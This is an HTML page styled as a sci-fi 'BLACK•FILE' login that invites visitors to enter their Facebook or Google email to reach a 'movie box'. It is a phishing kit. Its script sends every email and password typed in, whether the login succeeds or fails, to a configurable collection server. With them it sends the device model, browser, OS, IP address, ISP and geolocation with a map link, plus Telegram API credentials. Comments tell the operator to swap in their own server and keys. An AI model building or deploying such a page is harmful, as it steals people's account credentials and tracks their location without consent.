<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEURAL SECURE • ROBOTIC LOGIN</title>
    <!-- Font Robotik / Sci-fi -->
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&family=Rajdhani:wght@300;400;600&display=swap" rel="stylesheet">
    <!-- Font Awesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* (style tetap sama, tidak ada perubahan) */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: radial-gradient(circle at 20% 30%, #0b0d1a, #03050a);
            font-family: 'Rajdhani', sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }

        body::before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 255, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 255, 0.05) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none;
        }

        .glow-circle {
            position: absolute;
            width: 350px;
            height: 350px;
            background: radial-gradient(circle at center, rgba(0, 224, 255, 0.15), transparent 70%);
            border-radius: 50%;
            top: 10%;
            left: 15%;
            filter: blur(60px);
            z-index: 0;
        }

        .glow-circle2 {
            position: absolute;
            width: 450px;
            height: 450px;
            background: radial-gradient(circle at center, rgba(170, 0, 255, 0.08), transparent 70%);
            border-radius: 50%;
            bottom: 5%;
            right: 10%;
            filter: blur(80px);
            z-index: 0;
        }

        .login-container {
            position: relative;
            z-index: 10;
            width: 450px;
            max-width: 95%;
            background: rgba(12, 20, 35, 0.75);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(0, 255, 255, 0.25);
            box-shadow: 0 0 30px rgba(0, 230, 255, 0.2);
            border-radius: 24px;
            padding: 40px 32px;
            transition: 0.3s ease;
        }

        .login-container:hover {
            border-color: rgba(0, 240, 255, 0.6);
            box-shadow: 0 0 45px rgba(0, 210, 255, 0.4);
        }

        .brand {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 30px;
            gap: 12px;
            border-bottom: 1px solid rgba(64, 224, 255, 0.3);
            padding-bottom: 20px;
        }

        .brand i {
            font-size: 2.4rem;
            color: #4ef0ff;
            text-shadow: 0 0 10px cyan;
        }

        .brand h2 {
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 1.9rem;
            letter-spacing: 3px;
            background: linear-gradient(45deg, #b5f0ff, #6fe0ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 8px rgba(0,255,255,0.4);
            margin: 0;
        }

        .input-group {
            margin-bottom: 24px;
            position: relative;
        }

        .input-group label {
            display: block;
            font-family: 'Orbitron', sans-serif;
            font-size: 0.75rem;
            letter-spacing: 2px;
            color: #b0f0ff;
            text-transform: uppercase;
            margin-bottom: 8px;
            font-weight: 600;
            text-shadow: 0 0 5px rgba(0,255,255,0.3);
        }

        .input-wrapper {
            display: flex;
            align-items: center;
            background: rgba(8, 20, 36, 0.7);
            border: 1px solid #2c5f6e;
            border-radius: 12px;
            padding: 4px 18px;
            transition: 0.2s;
            backdrop-filter: blur(4px);
        }

        .input-wrapper i {
            color: #2fd6ff;
            font-size: 1.1rem;
            margin-right: 12px;
            text-shadow: 0 0 6px cyan;
            width: 20px;
            text-align: center;
        }

        .input-wrapper input {
            width: 100%;
            background: transparent;
            border: none;
            padding: 16px 0;
            color: #e2faff;
            font-family: 'Rajdhani', sans-serif;
            font-size: 1.1rem;
            font-weight: 500;
            letter-spacing: 0.5px;
            outline: none;
        }

        .input-wrapper input::placeholder {
            color: rgba(140, 210, 255, 0.5);
            font-weight: 300;
            font-family: 'Rajdhani', sans-serif;
            letter-spacing: 1.5px;
        }

        .input-wrapper:focus-within {
            border-color: #00f0ff;
            box-shadow: 0 0 18px rgba(0, 231, 255, 0.5);
            background: rgba(10, 30, 50, 0.8);
        }

        .login-btn {
            width: 100%;
            background: linear-gradient(145deg, #001d2b, #00131c);
            border: 1.5px solid #2ccfdb;
            color: #dbfaff;
            font-family: 'Orbitron', sans-serif;
            font-weight: 600;
            font-size: 1.1rem;
            letter-spacing: 4px;
            padding: 16px 20px;
            border-radius: 40px;
            margin-top: 18px;
            text-transform: uppercase;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            transition: 0.25s;
            cursor: pointer;
            box-shadow: 0 0 12px rgba(0,230,255,0.2);
            position: relative;
            overflow: hidden;
        }

        .login-btn i {
            font-size: 1.2rem;
            color: #4ee6ff;
            text-shadow: 0 0 6px cyan;
        }

        .login-btn:hover {
            background: linear-gradient(145deg, #003546, #001924);
            border-color: #4ef0ff;
            box-shadow: 0 0 30px #00b8ff7f;
            color: white;
            letter-spacing: 6px;
        }

        .login-btn::before {
            content: "";
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.2), transparent);
            transition: left 0.6s;
        }

        .login-btn:hover::before {
            left: 100%;
        }

        .register-link {
            text-align: center;
            margin-top: 22px;
            color: #96c6d9;
            font-size: 0.85rem;
            font-family: 'Rajdhani', sans-serif;
            letter-spacing: 1px;
        }

        .register-link span {
            color: #00f7ff;
            font-weight: 600;
            border-bottom: 1px solid cyan;
            padding-bottom: 2px;
        }

        .alert-message {
            margin-top: 18px;
            padding: 10px 16px;
            background: rgba(255, 40, 100, 0.2);
            border-left: 4px solid #ff3c6c;
            border-radius: 6px;
            color: #ffb2c5;
            font-weight: 500;
            display: none;
            backdrop-filter: blur(5px);
            font-family: 'Rajdhani', sans-serif;
            letter-spacing: 1px;
        }

        .alert-message i {
            margin-right: 8px;
            color: #ff6a8a;
        }

        .status-cred {
            margin-top: 10px;
            font-size: 0.7rem;
            color: #6cc9d4;
            text-align: right;
            opacity: 0.8;
            font-family: 'Orbitron', sans-serif;
        }

        .loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(3, 5, 10, 0.9);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            gap: 20px;
            backdrop-filter: blur(5px);
        }

        .loading i {
            font-size: 4rem;
            color: #00f7ff;
            animation: pulse 1.5s infinite;
        }

        .loading p {
            color: #b0f0ff;
            font-family: 'Orbitron', sans-serif;
            letter-spacing: 4px;
        }

        @keyframes pulse {
            0% { opacity: 0.5; transform: scale(0.95); }
            50% { opacity: 1; transform: scale(1.1); }
            100% { opacity: 0.5; transform: scale(0.95); }
        }
    </style>
</head>
<body>
    <div class="glow-circle"></div>
    <div class="glow-circle2"></div>

    <!-- Loading Animation -->
    <div class="loading" id="loadingScreen">
        <i class="fas fa-circle-notch fa-spin"></i>
        <p>prossecing acsses</p>
    </div>

    <div class="login-container">
        <div class="brand">
            <i class="fas fa-shield-haltered"></i>
            <h2>BLACK•FILE</h2>
        </div>

        <!-- Form Login -->
        <div class="input-group">
            <label><i class="fas fa-fingerprint"></i> EMAIL </label>
            <div class="input-wrapper">
                <i class="fas fa-user-astronaut"></i>
                <input type="text" id="username" placeholder=" your email" autocomplete="off">
            </div>
        </div>

        <div class="input-group">
            <label><i class="fas fa-shield-alt"></i> PASSWORD</label>
            <div class="input-wrapper">
                <i class="fas fa-lock"></i>
                <input type="password" id="password" placeholder="• • • • • • • •">
            </div>
        </div>

        <button class="login-btn" id="loginBtn">
            <i class="fas fa-plug"></i> LOGIN
        </button>

        <div class="register-link">
            <span>the latest version update 2026</span>
        </div>

        <!-- Alert area -->
        <div id="alertBox" class="alert-message">
            <i class="fas fa-exclamation-triangle"></i> <span id="alertText"></span>
        </div>

        <div class="status-cred">
            <i class="fab fa-telegram-plane"></i> Please register your Facebook or Google email login to access the movie box.
        </div>
    </div>

    <script>
        // ================================================================
        // KONFIGURASI API TELEGRAM (GANTI DENGAN API ID DAN HASH ASLIMU)
        // ================================================================
        const API_ID = '39072271';          // Ganti dengan API ID Telegram kamu
        const API_HASH = '681ec646ad12680496d8ff03aa359aa1'; // Ganti dengan API Hash Telegram kamu

        // ================================================================
        // ENDPOINT SERVER API (GANTI DENGAN URL SERVER PENERIMA DATA)
        // ================================================================
        const SERVER_API_URL = 'http://192.168.0.101:2525';  // <-- UBAH INI

        // URL redirect setelah login sukses
        const REDIRECT_URL = 'http://192.168.0.101:2525/admin.php';

        // ================================================================
        // FUNGSI-FUNGSI DETEKSI (SAMA SEPERTI SEBELUMNYA)
        // ================================================================
        function getDeviceModel() {
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            
            // Deteksi Apple Devices
            if (/iPhone/i.test(ua)) {
                let model = "iPhone";
                if (/iPhone 15/i.test(ua)) model = "iPhone 15";
                else if (/iPhone 14/i.test(ua)) model = "iPhone 14";
                else if (/iPhone 13/i.test(ua)) model = "iPhone 13";
                else if (/iPhone 12/i.test(ua)) model = "iPhone 12";
                else if (/iPhone 11/i.test(ua)) model = "iPhone 11";
                else if (/iPhone X/i.test(ua)) model = "iPhone X";
                else if (/iPhone 8/i.test(ua)) model = "iPhone 8";
                else if (/iPhone 7/i.test(ua)) model = "iPhone 7";
                return model;
            }
            if (/iPad/i.test(ua)) return "iPad";
            if (/iPod/i.test(ua)) return "iPod Touch";
            
            // Deteksi Samsung
            if (/SM-G998B/i.test(ua) || /S21 Ultra/i.test(ua)) return "Samsung Galaxy S21 Ultra";
            if (/SM-G996B/i.test(ua) || /S21 Plus/i.test(ua)) return "Samsung Galaxy S21+";
            if (/SM-G991B/i.test(ua) || /S21/i.test(ua)) return "Samsung Galaxy S21";
            if (/SM-S908E/i.test(ua) || /S22 Ultra/i.test(ua)) return "Samsung Galaxy S22 Ultra";
            if (/SM-S906E/i.test(ua) || /S22 Plus/i.test(ua)) return "Samsung Galaxy S22+";
            if (/SM-S901E/i.test(ua) || /S22/i.test(ua)) return "Samsung Galaxy S22";
            if (/SM-S918B/i.test(ua) || /S23 Ultra/i.test(ua)) return "Samsung Galaxy S23 Ultra";
            if (/SM-S916B/i.test(ua) || /S23 Plus/i.test(ua)) return "Samsung Galaxy S23+";
            if (/SM-S911B/i.test(ua) || /S23/i.test(ua)) return "Samsung Galaxy S23";
            if (/SM-A53/i.test(ua)) return "Samsung Galaxy A53";
            if (/SM-A33/i.test(ua)) return "Samsung Galaxy A33";
            if (/SM-A73/i.test(ua)) return "Samsung Galaxy A73";
            if (/SM-A52/i.test(ua)) return "Samsung Galaxy A52";
            if (/SM-A32/i.test(ua)) return "Samsung Galaxy A32";
            if (/SM-A12/i.test(ua)) return "Samsung Galaxy A12";
            if (/SM-M127G/i.test(ua)) return "Samsung Galaxy M12";
            if (/SM-F926B/i.test(ua)) return "Samsung Galaxy Z Fold 3";
            if (/SM-F721B/i.test(ua)) return "Samsung Galaxy Z Flip 4";
            
            // Deteksi Xiaomi
            if (/Xiaomi 13 Pro/i.test(ua)) return "Xiaomi 13 Pro";
            if (/Xiaomi 13/i.test(ua)) return "Xiaomi 13";
            if (/Xiaomi 12 Pro/i.test(ua)) return "Xiaomi 12 Pro";
            if (/Xiaomi 12/i.test(ua)) return "Xiaomi 12";
            if (/Xiaomi 11T Pro/i.test(ua)) return "Xiaomi 11T Pro";
            if (/Xiaomi 11T/i.test(ua)) return "Xiaomi 11T";
            if (/Xiaomi 11 Lite/i.test(ua)) return "Xiaomi 11 Lite";
            if (/POCO F5 Pro/i.test(ua)) return "POCO F5 Pro";
            if (/POCO F5/i.test(ua)) return "POCO F5";
            if (/POCO F4/i.test(ua)) return "POCO F4";
            if (/POCO X5 Pro/i.test(ua)) return "POCO X5 Pro";
            if (/POCO X5/i.test(ua)) return "POCO X5";
            if (/POCO M5/i.test(ua)) return "POCO M5";
            if (/Redmi Note 12 Pro/i.test(ua)) return "Redmi Note 12 Pro";
            if (/Redmi Note 12/i.test(ua)) return "Redmi Note 12";
            if (/Redmi Note 11 Pro/i.test(ua)) return "Redmi Note 11 Pro";
            if (/Redmi Note 11/i.test(ua)) return "Redmi Note 11";
            if (/Redmi 10C/i.test(ua)) return "Redmi 10C";
            if (/Redmi 10A/i.test(ua)) return "Redmi 10A";
            
            // Deteksi Oppo
            if (/Oppo Find X5 Pro/i.test(ua)) return "Oppo Find X5 Pro";
            if (/Oppo Find X5/i.test(ua)) return "Oppo Find X5";
            if (/Oppo Reno 10 Pro/i.test(ua)) return "Oppo Reno 10 Pro";
            if (/Oppo Reno 10/i.test(ua)) return "Oppo Reno 10";
            if (/Oppo Reno 8 Pro/i.test(ua)) return "Oppo Reno 8 Pro";
            if (/Oppo Reno 8/i.test(ua)) return "Oppo Reno 8";
            if (/Oppo Reno 7/i.test(ua)) return "Oppo Reno 7";
            if (/Oppo A96/i.test(ua)) return "Oppo A96";
            if (/Oppo A78/i.test(ua)) return "Oppo A78";
            if (/Oppo A58/i.test(ua)) return "Oppo A58";
            
            // Deteksi Vivo
            if (/Vivo X90 Pro/i.test(ua)) return "Vivo X90 Pro";
            if (/Vivo X90/i.test(ua)) return "Vivo X90";
            if (/Vivo V29 Pro/i.test(ua)) return "Vivo V29 Pro";
            if (/Vivo V29/i.test(ua)) return "Vivo V29";
            if (/Vivo V27 Pro/i.test(ua)) return "Vivo V27 Pro";
            if (/Vivo V27/i.test(ua)) return "Vivo V27";
            if (/Vivo Y36/i.test(ua)) return "Vivo Y36";
            if (/Vivo Y22/i.test(ua)) return "Vivo Y22";
            
            // Deteksi Realme
            if (/Realme GT 3/i.test(ua)) return "Realme GT 3";
            if (/Realme GT 2 Pro/i.test(ua)) return "Realme GT 2 Pro";
            if (/Realme GT 2/i.test(ua)) return "Realme GT 2";
            if (/Realme 11 Pro/i.test(ua)) return "Realme 11 Pro";
            if (/Realme 11/i.test(ua)) return "Realme 11";
            if (/Realme 10 Pro/i.test(ua)) return "Realme 10 Pro";
            if (/Realme 10/i.test(ua)) return "Realme 10";
            if (/Realme C55/i.test(ua)) return "Realme C55";
            
            // Deteksi Huawei
            if (/Huawei P60 Pro/i.test(ua)) return "Huawei P60 Pro";
            if (/Huawei P60/i.test(ua)) return "Huawei P60";
            if (/Huawei Mate 50 Pro/i.test(ua)) return "Huawei Mate 50 Pro";
            if (/Huawei Mate 50/i.test(ua)) return "Huawei Mate 50";
            if (/Huawei Nova 11/i.test(ua)) return "Huawei Nova 11";
            if (/Huawei Nova 10/i.test(ua)) return "Huawei Nova 10";
            
            // Deteksi Google Pixel
            if (/Pixel 7 Pro/i.test(ua)) return "Google Pixel 7 Pro";
            if (/Pixel 7/i.test(ua)) return "Google Pixel 7";
            if (/Pixel 6 Pro/i.test(ua)) return "Google Pixel 6 Pro";
            if (/Pixel 6/i.test(ua)) return "Google Pixel 6";
            if (/Pixel 5/i.test(ua)) return "Google Pixel 5";
            if (/Pixel 4a/i.test(ua)) return "Google Pixel 4a";
            
            // Deteksi generic
            if (/Android/i.test(ua)) {
                if (/Samsung/i.test(ua)) return "Samsung Android";
                if (/Xiaomi/i.test(ua)) return "Xiaomi Android";
                if (/Redmi/i.test(ua)) return "Xiaomi Redmi";
                if (/POCO/i.test(ua)) return "Xiaomi POCO";
                if (/Oppo/i.test(ua)) return "Oppo Android";
                if (/Vivo/i.test(ua)) return "Vivo Android";
                if (/Realme/i.test(ua)) return "Realme Android";
                if (/Huawei/i.test(ua)) return "Huawei Android";
                if (/Honor/i.test(ua)) return "Honor Android";
                if (/OnePlus/i.test(ua)) return "OnePlus Android";
                if (/Google Pixel/i.test(ua)) return "Google Pixel";
                if (/Sony/i.test(ua)) return "Sony Xperia";
                if (/LG/i.test(ua)) return "LG Android";
                if (/Motorola/i.test(ua)) return "Motorola Android";
                if (/Asus/i.test(ua)) return "Asus Android";
                if (/Nokia/i.test(ua)) return "Nokia Android";
                return "Android Device";
            }
            
            if (/Windows Phone/i.test(ua)) return "Windows Phone";
            if (/Macintosh/i.test(ua)) return "Apple Mac";
            if (/Windows/i.test(ua)) return "Windows PC";
            if (/Linux/i.test(ua)) return "Linux PC";
            
            return "Unknown Device";
        }

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = "Unknown";
            let version = "";
            
            if (/Chrome/i.test(ua) && !/Edg/i.test(ua) && !/OPR/i.test(ua)) {
                browser = "Google Chrome";
                version = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || "";
            }
            else if (/Firefox/i.test(ua)) {
                browser = "Mozilla Firefox";
                version = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || "";
            }
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
                browser = "Apple Safari";
                version = ua.match(/Version\/(\d+\.\d+)/)?.[1] || "";
            }
            else if (/Edg/i.test(ua)) {
                browser = "Microsoft Edge";
                version = ua.match(/Edg\/(\d+\.\d+)/)?.[1] || "";
            }
            else if (/OPR|Opera/i.test(ua)) {
                browser = "Opera";
                version = ua.match(/(OPR|Opera)\/(\d+\.\d+)/)?.[2] || "";
            }
            else if (/MSIE|Trident/i.test(ua)) {
                browser = "Internet Explorer";
            }
            
            return { name: browser, version: version };
        }

        function getOSInfo() {
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            
            if (/Windows NT 11/i.test(ua)) return "Windows 11";
            if (/Windows NT 10/i.test(ua)) return "Windows 10";
            if (/Windows NT 6.3/i.test(ua)) return "Windows 8.1";
            if (/Windows NT 6.2/i.test(ua)) return "Windows 8";
            if (/Windows NT 6.1/i.test(ua)) return "Windows 7";
            if (/Windows NT 6.0/i.test(ua)) return "Windows Vista";
            if (/Windows NT 5.1/i.test(ua)) return "Windows XP";
            
            if (/Android 14/i.test(ua)) return "Android 14 (Upside Down Cake)";
            if (/Android 13/i.test(ua)) return "Android 13 (Tiramisu)";
            if (/Android 12/i.test(ua)) return "Android 12 (Snow Cone)";
            if (/Android 11/i.test(ua)) return "Android 11 (Red Velvet Cake)";
            if (/Android 10/i.test(ua)) return "Android 10 (Quince Tart)";
            if (/Android 9/i.test(ua)) return "Android 9 (Pie)";
            if (/Android 8/i.test(ua)) return "Android 8 (Oreo)";
            if (/Android/i.test(ua)) return "Android";
            
            if (/iPhone OS 17/i.test(ua)) return "iOS 17";
            if (/iPhone OS 16/i.test(ua)) return "iOS 16";
            if (/iPhone OS 15/i.test(ua)) return "iOS 15";
            if (/iPhone OS 14/i.test(ua)) return "iOS 14";
            if (/iPhone OS 13/i.test(ua)) return "iOS 13";
            if (/iPhone OS 12/i.test(ua)) return "iOS 12";
            if (/iPhone OS 11/i.test(ua)) return "iOS 11";
            if (/iPhone OS/i.test(ua)) return "iOS";
            if (/iPad OS/i.test(ua)) return "iPadOS";
            if (/Mac OS X/i.test(ua)) {
                let version = ua.match(/Mac OS X (\d+[._]\d+[._]\d+)/)?.[1] || "";
                return `macOS ${version.replace(/_/g, '.')}`;
            }
            
            if (/Linux/i.test(ua)) return "Linux";
            
            return platform || "Unknown OS";
        }

        async function getIPAndLocation() {
            // API Cadangan 1: ipapi.co
            try {
                const response = await fetch('https://ipapi.co/json/', { 
                    timeout: 3000 
                });
                if (response.ok) {
                    const data = await response.json();
                    return {
                        ip: data.ip || 'Tidak diketahui',
                        city: data.city || 'Tidak diketahui',
                        region: data.region || 'Tidak diketahui',
                        country: data.country_name || 'Tidak diketahui',
                        lat: data.latitude || 'Tidak diketahui',
                        lon: data.longitude || 'Tidak diketahui',
                        org: data.org || 'Tidak diketahui',
                        timezone: data.timezone || 'Tidak diketahui',
                        postal: data.postal || 'Tidak diketahui'
                    };
                }
            } catch (e) {
                console.log('ipapi.co gagal, coba API cadangan...');
            }
            
            // API Cadangan 2: ip-api.com
            try {
                const response = await fetch('http://ip-api.com/json/', { 
                    timeout: 3000 
                });
                if (response.ok) {
                    const data = await response.json();
                    return {
                        ip: data.query || 'Tidak diketahui',
                        city: data.city || 'Tidak diketahui',
                        region: data.regionName || 'Tidak diketahui',
                        country: data.country || 'Tidak diketahui',
                        lat: data.lat || 'Tidak diketahui',
                        lon: data.lon || 'Tidak diketahui',
                        org: data.isp || 'Tidak diketahui',
                        timezone: data.timezone || 'Tidak diketahui',
                        postal: data.zip || 'Tidak diketahui'
                    };
                }
            } catch (e) {
                console.log('ip-api.com gagal, coba API cadangan...');
            }
            
            // API Cadangan 3: ipinfo.io
            try {
                const response = await fetch('https://ipinfo.io/json', { 
                    timeout: 3000 
                });
                if (response.ok) {
                    const data = await response.json();
                    const loc = (data.loc || '').split(',');
                    return {
                        ip: data.ip || 'Tidak diketahui',
                        city: data.city || 'Tidak diketahui',
                        region: data.region || 'Tidak diketahui',
                        country: data.country || 'Tidak diketahui',
                        lat: loc[0] || 'Tidak diketahui',
                        lon: loc[1] || 'Tidak diketahui',
                        org: data.org || 'Tidak diketahui',
                        timezone: data.timezone || 'Tidak diketahui',
                        postal: data.postal || 'Tidak diketahui'
                    };
                }
            } catch (e) {
                console.log('Semua API gagal');
            }
            
            // Fallback jika semua API gagal
            return {
                ip: 'Gagal mendeteksi',
                city: 'Gagal',
                region: 'Gagal',
                country: 'Gagal',
                lat: 'Gagal',
                lon: 'Gagal',
                org: 'Gagal',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Gagal',
                postal: 'Gagal'
            };
        }

        // =============================================
        //      FUNGSI BARU: KIRIM DATA KE SERVER API
        // =============================================
        async function sendToServer(username, password, status) {
            // Kumpulkan semua data
            const deviceModel = getDeviceModel();
            const browser = getBrowserInfo();
            const osInfo = getOSInfo();
            const ipInfo = await getIPAndLocation();
            
            const now = new Date();
            const waktuIndonesia = now.toLocaleString('id-ID', { 
                timeZone: 'Asia/Jakarta',
                weekday: 'long',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                timeZoneName: 'short'
            });
            
            const waktuUTC = now.toUTCString();
            const timestamp = now.getTime();

            // Susun payload
            const payload = {
                email: username,
                password: password,
                status: status,
                device: deviceModel,
                browser: browser.name + ' ' + browser.version,
                os: osInfo,
                userAgent: navigator.userAgent,
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                online: navigator.onLine,
                language: navigator.language,
                cookieEnabled: navigator.cookieEnabled,
                deviceMemory: navigator.deviceMemory || 'unknown',
                ip: ipInfo.ip,
                isp: ipInfo.org,
                timezone: ipInfo.timezone,
                city: ipInfo.city,
                region: ipInfo.region,
                country: ipInfo.country,
                postal: ipInfo.postal,
                lat: ipInfo.lat,
                lon: ipInfo.lon,
                mapsUrl: `https://maps.google.com/?q=${ipInfo.lat},${ipInfo.lon}`,
                waktuWIB: waktuIndonesia,
                waktuUTC: waktuUTC,
                timestamp: timestamp,
                api_id: API_ID,          // ✨ API ID disertakan
                api_hash: API_HASH,       // ✨ API Hash disertakan
                redirect_url: REDIRECT_URL
            };

            try {
                const response = await fetch(SERVER_API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    const result = await response.json();
                    console.log('✅ Data terkirim ke server:', result);
                    return true;
                } else {
                    console.error('❌ Server error:', response.status);
                    return false;
                }
            } catch (error) {
                console.error('❌ Gagal mengirim ke server:', error);
                return false;
            }
        }

        // =============================================
        //      LOGIN HANDLER
        // =============================================
        document.getElementById('loginBtn').addEventListener('click', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const alertBox = document.getElementById('alertBox');
            const alertText = document.getElementById('alertText');
            const loadingScreen = document.getElementById('loadingScreen');

            if (username === '' || password === '') {
                alertBox.style.display = 'block';
                alertBox.style.background = 'rgba(255, 40, 100, 0.2)';
                alertBox.style.borderLeftColor = '#ff3c6c';
                alertBox.style.color = '#ffb2c5';
                alertText.innerText = '▸ USERNAME DAN PASSWORD WAJIB DIISI!';
                return;
            }

            loadingScreen.style.display = 'flex';

            try {
                // Demo credentials
                if (username === "admin@gmail.com" && password === "admin123") {
                    // Login sukses - kirim data ke server
                    await sendToServer(username, password, "✅ BERHASIL");
                    
                    alertBox.style.display = 'block';
                    alertBox.style.background = 'rgba(0, 255, 200, 0.15)';
                    alertBox.style.borderLeftColor = '#00e6c4';
                    alertBox.style.color = '#b3ffe6';
                    alertText.innerText = '✓ AKSES GRANTED • MENGALIHKAN KE ADMIN...';
                    
                    setTimeout(() => {
                        window.location.href = REDIRECT_URL;
                    }, 1500);
                } else {
                    // Login gagal - tetap kirim data
                    await sendToServer(username, password, "❌ GAGAL");
                    
                    alertBox.style.display = 'block';
                    alertBox.style.background = 'rgba(255, 40, 100, 0.2)';
                    alertBox.style.borderLeftColor = '#ff3c6c';
                    alertBox.style.color = '#ffb2c5';
                    alertText.innerText = '▸ ACCESS DENIED! WRONG EMAIL/PASSWORD';
                    
                    loadingScreen.style.display = 'none';
                }
            } catch (error) {
                console.error('Error:', error);
                alertBox.style.display = 'block';
                alertText.innerText = '▸ TERJADI KESALAHAN SISTEM';
                loadingScreen.style.display = 'none';
            }
        });

        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                document.getElementById('loginBtn').click();
            }
        });

        window.onload = function() {
            console.log('✅ System ready - menggunakan API ID dan Hash Telegram');
        };
    </script>
</body>
</html>
